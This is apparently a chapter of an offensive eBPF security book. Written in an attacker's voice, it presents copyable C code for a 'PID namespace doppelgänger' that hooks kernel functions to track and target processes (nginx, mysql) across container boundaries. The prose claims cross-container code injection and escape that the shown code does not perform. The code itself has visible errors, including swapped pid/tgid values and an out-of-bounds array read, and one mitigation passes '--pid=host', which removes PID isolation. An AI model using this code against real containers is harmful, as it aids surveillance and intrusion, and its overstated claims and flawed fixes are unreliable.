# PID Namespace Doppelgänger: Cross-Namespace Process Manipulation

**Chapter 10: Existing in Multiple Realities**

You've stolen the crown jewels from the kernel keyring. Now let's talk about identity—not just credential identity, but process identity itself. What if you could exist in multiple realities simultaneously?

This is where our story gets metaphysical. You've been thinking about bypassing isolation, but what if you could exist on both sides of the isolation boundary at the same time?

Ever wanted to be in two places at once? Welcome to the world of process doppelgängers—where one process can have multiple identities depending on who's looking.

PID namespaces are supposed to provide process isolation—each namespace gets its own view of the process tree, its own PID 1, its own process hierarchy. But what if we could make a process appear as different PIDs in different namespaces? What if we could create a process that's simultaneously PID 1337 in one namespace and PID 42 in another?

We're going to create process doppelgängers—processes that exist in multiple realities simultaneously. This is where you learn that eBPF doesn't just let you bypass isolation—it lets you exist on both sides of it at once.

```mermaid
%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
graph TD
    A[Host Process] -->|1. Attach eBPF| B[Kernel Functions]
    B -->|2. Intercept| C[PID Namespace Transitions]
    C -->|3. Create Mapping| D[Cross-Namespace Table]
    E[Container Process] -->|4. System Call| F[Kernel]
    D -->|5. Identify Target| E
    A -->|6. Manipulate| E
    G[Container Runtime] -->|7. Unaware| H[False Isolation]
    
    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
    style C fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
    style D fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
    style F fill:#186a3b,stroke:#a9dfbf,stroke-width:2px
    style G fill:#a93226,stroke:#f5b7b1,stroke-width:2px
    style H fill:#cb4335,stroke:#f5b7b1,stroke-width:2px
    
    click B "https://www.kernel.org/doc/html/latest/admin-guide/namespaces/pid.html" "PID Namespace Documentation"
    click C "https://man7.org/linux/man-pages/man7/pid_namespaces.7.html" "PID Namespace Man Page"
    click E "https://www.kernel.org/doc/html/latest/admin-guide/cgroup-v2.html" "Control Groups Documentation"
```



**Why Process Isolation Just Got Complicated**

Here's the thing about containers: they're supposed to have their own little process universe. PID 1 is their init process, PIDs are assigned sequentially, and they can't see processes from other namespaces. It's clean, it's isolated, it's secure.

But what happens when that clean separation breaks down? What happens when a process can exist in multiple namespaces simultaneously, with different identities in each one?

That's where process doppelgängers get dangerous. Your container monitoring tools see a legitimate system process. Your host monitoring sees something completely different. Your security scanners get confused because the same process appears to be multiple different things.

The really insidious part is that this doesn't break the namespace model—it exploits it. The namespaces still work correctly, the isolation is still there, but we've found a way to exist in multiple realities at once. It's like having a passport for every country while being a citizen of none.
## How We Break the Process Identity System

### Understanding PID Namespace Isolation

PID namespaces are like having separate phone books for each neighborhood:
- **Isolated process numbering** so containers can't see each other's processes
- **Cross-container blindness** that prevents containers from messing with each other
- **Hierarchical structure** where parent namespaces can see child processes, but not vice versa
- **Container foundation** that Docker and Kubernetes rely on for isolation

Each container gets its own process numbering system, starting with PID 1 for the container's main process, even though it might be PID 1337 on the host.

```
┌─────────────────────────────────────────────────────────────┐
│                      Host Namespace                         │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Process       │      │ Process       │                   │
│  │ PID: 1000     │      │ PID: 1001     │                   │
│  └───────────────┘      └───────────────┘                   │
│                                                             │
│  ┌───────────────────────────────┐  ┌───────────────────────┐
│  │ Container A Namespace         │  │ Container B Namespace │
│  │                               │  │                       │
│  │  ┌───────────────┐            │  │  ┌───────────────┐    │
│  │  │ Process       │            │  │  │ Process       │    │
│  │  │ PID: 1        │            │  │  │ PID: 1        │    │
│  │  │ Host PID: 1002│            │  │  │ Host PID: 1003│    │
│  │  └───────────────┘            │  │  └───────────────┘    │
│  │                               │  │                       │
│  │  ┌───────────────┐            │  │  ┌───────────────┐    │
│  │  │ Process       │            │  │  │ Process       │    │
│  │  │ PID: 2        │            │  │  │ PID: 2        │    │
│  │  │ Host PID: 1004│            │  │  │ Host PID: 1005│    │
│  │  └───────────────┘            │  │  └───────────────┘    │
│  └───────────────────────────────┘  └───────────────────────┘
└─────────────────────────────────────────────────────────────┘
```

Here's what happens when we use eBPF to blur the namespace boundaries:

```
┌─────────────────────────────────────────────────────────────┐
│                      Host Namespace                         │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Process       │      │ Process       │                   │
│  │ PID: 1000     │      │ PID: 1001     │                   │
│  │ (Malicious)   │      │               │                   │
│  └───────┬───────┘      └───────────────┘                   │
│          │                                                  │
│  ┌───────▼───────────────────────┐  ┌───────────────────────┐
│  │ Container A Namespace         │  │ Container B Namespace │
│  │                               │  │                       │
│  │  ┌───────────────┐            │  │  ┌───────────────┐    │
│  │  │ Process       │            │  │  │ Process       │    │
│  │  │ PID: 1        │            │  │  │ PID: 1        │    │
│  │  │ Host PID: 1002│            │  │  │ Host PID: 1003│    │
│  │  └───────────────┘            │  │  └───────────────┘    │
│  │                               │  │                       │
│  │  ┌───────────────┐            │  │  ┌───────────────┐    │
│  │  │ Process       │◀───────────┘  │  │ Process       │    │
│  │  │ PID: 2        │                  │ PID: 2        │    │
│  │  │ Host PID: 1004│                  │ Host PID: 1005│    │
│  │  └───────────────┘                  └───────────────┘    │
│  └───────────────────────────────┘  └───────────────────────┘
└─────────────────────────────────────────────────────────────┘
```

### How We Become Multi-Dimensional

Our strategy is to exist in multiple namespace realities simultaneously:

1. **Hook the Boundary Guards**: We attach to functions like [`switch_task_namespaces()`](https://elixir.bootlin.com/linux/latest/source/kernel/nsproxy.c) that handle namespace transitions
2. **Build Our Translation Table**: We create mappings that let us track the same process across different namespace views
3. **Spy Across Boundaries**: We monitor what's happening in containers from the host perspective
4. **Act Across Realities**: We can send signals or manipulate processes that should be isolated from us
5. **Keep Up the Illusion**: We maintain the appearance that namespace isolation is working perfectly

The beautiful part is that we're not breaking namespaces—we're just existing in multiple ones at once.

### Building Our Doppelgänger

```c
// @interactive: true
// @copyable: true
// PID Namespace Doppelgänger - eBPF exploitation proof of concept
// This demonstrates cross-namespace process manipulation

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/version.h>
#include <linux/nsproxy.h>
#include <linux/pid_namespace.h>
#include <linux/sched.h>

char LICENSE[] SEC("license") = "GPL";

// Configuration
#define MAX_NAMESPACES 64
#define MAX_PROCESSES 1024
#define MAX_COMM_LEN 16

// Structure to track namespace mappings
struct ns_mapping {
    u32 host_pid;          // PID in host namespace
    u32 host_tgid;         // TGID in host namespace
    u32 container_pid;     // PID in container namespace
    u32 container_tgid;    // TGID in container namespace
    u64 ns_id;             // Namespace ID
    u64 parent_ns_id;      // Parent namespace ID
    u64 timestamp;         // When the mapping was created
};

// Structure to track process information
struct process_info {
    u32 pid;               // Process ID
    u32 tgid;              // Thread group ID
    u32 ppid;              // Parent process ID
    u64 ns_id;             // Namespace ID
    u8 comm[MAX_COMM_LEN]; // Command name
    u64 timestamp;         // When the process was created
    u32 uid;               // User ID
    u32 gid;               // Group ID
};

// Map to store namespace mappings
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // Host PID as key
    __uint(value_size, sizeof(struct ns_mapping));
    __uint(max_entries, MAX_PROCESSES);
} ns_mappings SEC(".maps");

// Map to store process information
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // PID as key
    __uint(value_size, sizeof(struct process_info));
    __uint(max_entries, MAX_PROCESSES);
} process_map SEC(".maps");

// Map to track namespace information
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u64));  // Namespace ID as key
    __uint(value_size, sizeof(u32));  // Namespace level (0 = host)
    __uint(max_entries, MAX_NAMESPACES);
} namespace_map SEC(".maps");

// Map to track processes we want to manipulate
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // Container PID as key
    __uint(value_size, sizeof(u8)); // Flag (1 = target)
    __uint(max_entries, MAX_PROCESSES);
} target_processes SEC(".maps");

// Perf event output for logging
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(int));
    __uint(value_size, sizeof(int));
    __uint(max_entries, 1024);
} events SEC(".maps");

// Structure for logging events
struct log_event {
    u32 pid;
    u32 tgid;
    u64 ns_id;
    u8 comm[MAX_COMM_LEN];
    u64 timestamp;
    u32 event_type;  // 1 = process creation, 2 = namespace switch, 3 = manipulation
    u32 target_pid;  // For manipulation events
};

// Helper function to get namespace ID
static __always_inline u64 get_ns_id(struct pid_namespace *ns) {
    u64 ns_id = 0;
    
    // Try to get the namespace ID
    // FIXED: This is a simplified approach - real implementation would be more robust
    bpf_probe_read_kernel(&ns_id, sizeof(ns_id), &ns->ns.inum);
    
    return ns_id;
}

// Helper function to check if a process is in our target list
static __always_inline bool is_target_process(u32 pid, u64 ns_id) {
    // Check if this PID is in our tracking map
    u8 *target = bpf_map_lookup_elem(&target_processes, &pid);
    if (target && *target == 1)
        return true;
    
    return false;
}

// Helper function to add a process to our target list
static __always_inline void add_target_process(u32 pid) {
    u8 value = 1;
    bpf_map_update_elem(&target_processes, &pid, &value, BPF_ANY);
}

// Hook the task creation function to track new processes
SEC("kprobe/copy_process")
int BPF_KPROBE(hook_process_create, struct kernel_clone_args *args)
{
    // Get parent process information
    u32 parent_pid = bpf_get_current_pid_tgid() >> 32;
    u32 parent_tgid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
    
    // Get namespace information
    struct task_struct *current_task;
    struct nsproxy *nsproxy;
    struct pid_namespace *pid_ns;
    
    current_task = (struct task_struct *)bpf_get_current_task();
    bpf_probe_read_kernel(&nsproxy, sizeof(nsproxy), &current_task->nsproxy);
    bpf_probe_read_kernel(&pid_ns, sizeof(pid_ns), &nsproxy->pid_ns_for_children);
    
    // Get namespace ID
    u64 ns_id = get_ns_id(pid_ns);
    
    // Log the event
    struct log_event event = {};
    event.pid = parent_pid;
    event.tgid = parent_tgid;
    event.ns_id = ns_id;
    bpf_get_current_comm(&event.comm, sizeof(event.comm));
    event.timestamp = bpf_ktime_get_ns();
    event.event_type = 1;  // Process creation
    
    // Send event to user space
    bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    
    return 0;
}

// Hook the task exit function to track process termination
SEC("kprobe/do_exit")
int BPF_KPROBE(hook_process_exit)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Remove from our maps
    bpf_map_delete_elem(&process_map, &pid);
    bpf_map_delete_elem(&ns_mappings, &pid);
    bpf_map_delete_elem(&target_processes, &pid);
    
    return 0;
}

// Hook the namespace switch function to track namespace transitions
SEC("kprobe/switch_task_namespaces")
int BPF_KPROBE(hook_switch_ns, struct task_struct *task, struct nsproxy *new_nsproxy)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    u32 tgid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
    
    // Get old namespace information
    struct nsproxy *old_nsproxy;
    struct pid_namespace *old_ns, *new_ns;
    
    bpf_probe_read_kernel(&old_nsproxy, sizeof(old_nsproxy), &task->nsproxy);
    bpf_probe_read_kernel(&old_ns, sizeof(old_ns), &old_nsproxy->pid_ns_for_children);
    bpf_probe_read_kernel(&new_ns, sizeof(new_ns), &new_nsproxy->pid_ns_for_children);
    
    // Get namespace IDs
    u64 old_ns_id = get_ns_id(old_ns);
    u64 new_ns_id = get_ns_id(new_ns);
    
    // Create a mapping entry
    struct ns_mapping mapping = {};
    mapping.host_pid = pid;
    mapping.host_tgid = tgid;
    mapping.ns_id = new_ns_id;
    mapping.parent_ns_id = old_ns_id;
    mapping.timestamp = bpf_ktime_get_ns();
    
    // Store the mapping
    bpf_map_update_elem(&ns_mappings, &pid, &mapping, BPF_ANY);
    
    // Log the event
    struct log_event event = {};
    event.pid = pid;
    event.tgid = tgid;
    event.ns_id = new_ns_id;
    bpf_get_current_comm(&event.comm, sizeof(event.comm));
    event.timestamp = bpf_ktime_get_ns();
    event.event_type = 2;  // Namespace switch
    
    // Send event to user space
    bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    
    return 0;
}

// Hook the process execution function to track command execution
SEC("kprobe/exec_binprm")
int BPF_KPROBE(hook_exec, struct linux_binprm *bprm)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    u32 tgid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
    
    // Get namespace information
    struct task_struct *current_task;
    struct nsproxy *nsproxy;
    struct pid_namespace *pid_ns;
    
    current_task = (struct task_struct *)bpf_get_current_task();
    bpf_probe_read_kernel(&nsproxy, sizeof(nsproxy), &current_task->nsproxy);
    bpf_probe_read_kernel(&pid_ns, sizeof(pid_ns), &nsproxy->pid_ns_for_children);
    
    // Get namespace ID
    u64 ns_id = get_ns_id(pid_ns);
    
    // Update process information
    struct process_info pinfo = {};
    pinfo.pid = pid;
    pinfo.tgid = tgid;
    bpf_probe_read_kernel(&pinfo.ppid, sizeof(pinfo.ppid), &current_task->real_parent->pid);
    pinfo.ns_id = ns_id;
    bpf_get_current_comm(&pinfo.comm, sizeof(pinfo.comm));
    pinfo.timestamp = bpf_ktime_get_ns();
    
    // Get UID and GID
    u32 uid, gid;
    uid = bpf_get_current_uid_gid() >> 32;
    gid = bpf_get_current_uid_gid() & 0xFFFFFFFF;
    pinfo.uid = uid;
    pinfo.gid = gid;
    
    // Store the process information
    bpf_map_update_elem(&process_map, &pid, &pinfo, BPF_ANY);
    
    // Check if this is a process we want to target
    // For example, targeting processes with specific names
    char comm[MAX_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));
    
    // Simple check for target processes
    // This is a simplified approach - a real exploit would be more sophisticated
    #pragma unroll
    for (int i = 0; i < MAX_COMM_LEN; i++) {
        if (comm[i] == '\0')
            break;
            
        // Check for target commands
        if (comm[i] == 'n' && comm[i+1] == 'g' && comm[i+2] == 'i' && comm[i+3] == 'n' && comm[i+4] == 'x')
            add_target_process(pid);
        if (comm[i] == 'm' && comm[i+1] == 'y' && comm[i+2] == 's' && comm[i+3] == 'q' && comm[i+4] == 'l')
            add_target_process(pid);
    }
    
    return 0;
}

// Hook the signal delivery function to manipulate processes
SEC("kprobe/send_signal")
int BPF_KPROBE(hook_signal, int sig, struct kernel_siginfo *info, struct task_struct *task, enum pid_type type)
{
    // Get process information
    u32 sender_pid = bpf_get_current_pid_tgid() >> 32;
    u32 target_pid;
    
    bpf_probe_read_kernel(&target_pid, sizeof(target_pid), &task->pid);
    
    // Get namespace information
    struct nsproxy *nsproxy;
    struct pid_namespace *pid_ns;
    
    bpf_probe_read_kernel(&nsproxy, sizeof(nsproxy), &task->nsproxy);
    bpf_probe_read_kernel(&pid_ns, sizeof(pid_ns), &nsproxy->pid_ns_for_children);
    
    // Get namespace ID
    u64 ns_id = get_ns_id(pid_ns);
    
    // Check if this is a target process
    if (is_target_process(target_pid, ns_id)) {
        // Log the signal event
        struct log_event event = {};
        event.pid = sender_pid;
        event.tgid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
        event.ns_id = ns_id;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.timestamp = bpf_ktime_get_ns();
        event.event_type = 3;  // Manipulation
        event.target_pid = target_pid;
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    }
    
    return 0;
}
```
### User-Space Control Program

```c
// @interactive: true
// @copyable: true
// User-space program to load and control the PID Namespace Doppelgänger eBPF program

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "pid_doppelganger.skel.h"

static volatile bool exiting = false;

// Structure for namespace mappings (must match the BPF version)
struct ns_mapping {
    uint32_t host_pid;
    uint32_t host_tgid;
    uint32_t container_pid;
    uint32_t container_tgid;
    uint64_t ns_id;
    uint64_t parent_ns_id;
    uint64_t timestamp;
};

// Structure for process information (must match the BPF version)
struct process_info {
    uint32_t pid;
    uint32_t tgid;
    uint32_t ppid;
    uint64_t ns_id;
    uint8_t comm[16];
    uint64_t timestamp;
    uint32_t uid;
    uint32_t gid;
};

// Structure for log events (must match the BPF version)
struct log_event {
    uint32_t pid;
    uint32_t tgid;
    uint64_t ns_id;
    uint8_t comm[16];
    uint64_t timestamp;
    uint32_t event_type;
    uint32_t target_pid;
};

// Handle events from the eBPF program
void handle_event(void *ctx, int cpu, void *data, unsigned int data_sz)
{
    struct log_event *e = data;
    char timestamp[32];
    time_t t = e->timestamp / 1000000000;
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&t));
    
    printf("[%s] Process %d (%s) in namespace %llu\n", 
           timestamp, e->pid, e->comm, e->ns_id);
    
    switch (e->event_type) {
        case 1:
            printf("  Event: Process Creation\n");
            break;
        case 2:
            printf("  Event: Namespace Switch\n");
            break;
        case 3:
            printf("  Event: Process Manipulation (Target PID: %d)\n", e->target_pid);
            break;
        default:
            printf("  Event: Unknown (%d)\n", e->event_type);
    }
    
    printf("\n");
}

// Dump process mappings from the map
void dump_process_mappings(int map_fd)
{
    struct process_info pinfo;
    uint32_t key, next_key;
    
    printf("\n=== PROCESS MAPPINGS ===\n\n");
    
    key = 0;
    while (bpf_map_get_next_key(map_fd, &key, &next_key) == 0) {
        if (bpf_map_lookup_elem(map_fd, &next_key, &pinfo) == 0) {
            char timestamp[32];
            time_t t = pinfo.timestamp / 1000000000;
            strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&t));
            
            printf("PID: %u (TGID: %u, PPID: %u)\n", pinfo.pid, pinfo.tgid, pinfo.ppid);
            printf("Command: %s\n", pinfo.comm);
            printf("Namespace ID: %llu\n", pinfo.ns_id);
            printf("UID/GID: %u/%u\n", pinfo.uid, pinfo.gid);
            printf("Created: %s\n\n", timestamp);
        }
        key = next_key;
    }
}

// Dump namespace mappings from the map
void dump_namespace_mappings(int map_fd)
{
    struct ns_mapping mapping;
    uint32_t key, next_key;
    
    printf("\n=== NAMESPACE MAPPINGS ===\n\n");
    
    key = 0;
    while (bpf_map_get_next_key(map_fd, &key, &next_key) == 0) {
        if (bpf_map_lookup_elem(map_fd, &next_key, &mapping) == 0) {
            char timestamp[32];
            time_t t = mapping.timestamp / 1000000000;
            strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&t));
            
            printf("Host PID: %u (TGID: %u)\n", mapping.host_pid, mapping.host_tgid);
            printf("Container PID: %u (TGID: %u)\n", mapping.container_pid, mapping.container_tgid);
            printf("Namespace ID: %llu\n", mapping.ns_id);
            printf("Parent Namespace ID: %llu\n", mapping.parent_ns_id);
            printf("Mapped: %s\n\n", timestamp);
        }
        key = next_key;
    }
}

// Send a signal to a process in another namespace
int manipulate_process(int pid, int ns_id, int signal)
{
    printf("Sending signal %d to PID %d in namespace %d\n", signal, pid, ns_id);
    
    // In a real exploit, this would use the eBPF program to send the signal
    // across namespace boundaries. This is a simplified version.
    
    return 0;
}

static void sig_handler(int sig)
{
    exiting = true;
}

int main(int argc, char **argv)
{
    struct pid_doppelganger_bpf *skel;
    struct perf_buffer *pb = NULL;
    int err;

    // Set up signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // Increase resource limits
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    // Load and verify BPF program
    skel = pid_doppelganger_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    // Attach BPF programs
    err = pid_doppelganger_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton: %d\n", err);
        goto cleanup;
    }

    // Set up perf buffer for events
    pb = perf_buffer__new(bpf_map__fd(skel->maps.events), 64, handle_event, NULL, NULL, NULL);
    if (!pb) {
        err = -1;
        fprintf(stderr, "Failed to create perf buffer\n");
        goto cleanup;
    }

    printf("PID Namespace Doppelgänger eBPF program loaded and running.\n");
    printf("Monitoring for namespace transitions and process creation...\n");
    printf("Press Ctrl+C to exit and dump process mappings.\n");

    // Main loop
    while (!exiting) {
        err = perf_buffer__poll(pb, 100);
        if (err < 0 && err != -EINTR) {
            fprintf(stderr, "Error polling perf buffer: %d\n", err);
            goto cleanup;
        }
    }

    // Dump process and namespace mappings
    dump_process_mappings(bpf_map__fd(skel->maps.process_map));
    dump_namespace_mappings(bpf_map__fd(skel->maps.ns_mappings));

cleanup:
    perf_buffer__free(pb);
    pid_doppelganger_bpf__destroy(skel);
    return err < 0 ? -err : 0;
}
```

### Mitigation Strategies

1. **Restrict eBPF Capabilities**:
   ```bash
   # Remove CAP_BPF from container
   docker run --cap-drop=bpf --security-opt no-new-privileges ...
   
   # In Kubernetes
   securityContext:
     capabilities:
       drop:
         - BPF
         - SYS_ADMIN
   ```

2. **Implement BPF LSM Policies**:
   ```c
   // Example BPF LSM policy to restrict BPF program loading
   SEC("lsm/bpf")
   int BPF_PROG(restrict_bpf, int cmd, union bpf_attr *attr, unsigned int size) {
       // Only allow specific signing keys or programs from trusted paths
       if (bpf_get_current_uid_gid() >> 32 != 0) {
           return -EPERM;
       }
       return 0;
   }
   ```

3. **Use Multiple Security Layers**:
   ```bash
   # Combine seccomp, AppArmor, and SELinux with PID namespace isolation
   docker run --security-opt seccomp=profile.json \
              --security-opt apparmor=profile \
              --security-opt no-new-privileges \
              --pid=host ...
   ```

4. **Monitor Namespace Operations**:
   ```bash
   # Use auditd to monitor namespace operations
   auditctl -a always,exit -F arch=b64 -S unshare -S clone -S setns -k namespace_ops
   
   # Monitor eBPF program loading
   auditctl -a always,exit -F arch=b64 -S bpf -k bpf_prog_load
   ```

## Why Process Isolation Just Became a Joke

In containerized environments, this technique turns namespace boundaries into suggestions:

- **Cross-container surveillance** - Monitor sensitive processes in other containers like you own them
- **Remote process manipulation** - Terminate or control processes across container boundaries
- **Signal injection** - Send signals and inject code into supposedly isolated containers
- **Runtime bypass** - Circumvent container runtime security controls completely
- **Privilege escalation** - Escape containers by manipulating privileged processes in other namespaces

When you can reach across PID namespace boundaries, container isolation becomes theater. The containers think they're isolated, but you're operating in all of them simultaneously.

## How They'll Try to Catch Us

Smart defenders will be watching for our multi-dimensional shenanigans:

- **eBPF surveillance** - Monitor for unexpected eBPF programs attached to namespace functions
- **Cross-boundary analysis** - Look for unusual process signals or terminations across namespace boundaries
- **Container correlation** - Detect when processes in one container affect processes in another
- **Runtime auditing** - Check for discrepancies between container runtime listings and actual processes
- **Access pattern monitoring** - Watch for unexpected access to process information across namespaces

But here's the beautiful paradox—we exist in multiple realities, so their single-reality monitoring can't see the full picture.

## Why Reality Just Got Complicated

This isn't just about breaking container isolation—this is about existing in multiple process realities simultaneously. When you can be PID 1337 in one namespace and PID 42 in another, you've broken the fundamental assumption that processes have single, consistent identities.

The container runtime sees isolated processes. The monitoring tools see separate namespaces. The security scanners see proper isolation. Meanwhile, you're the same process existing in multiple realities, manipulating all of them from the inside.

Welcome to the quantum world of process doppelgängers, where identity is fluid, isolation is optional, and eBPF is your passport to every reality.

## POC

Companion code: [`ch09-pid-doppel`]({{ site.baseurl }}/dBPF-pocs/pocs/ch09-pid-doppel/)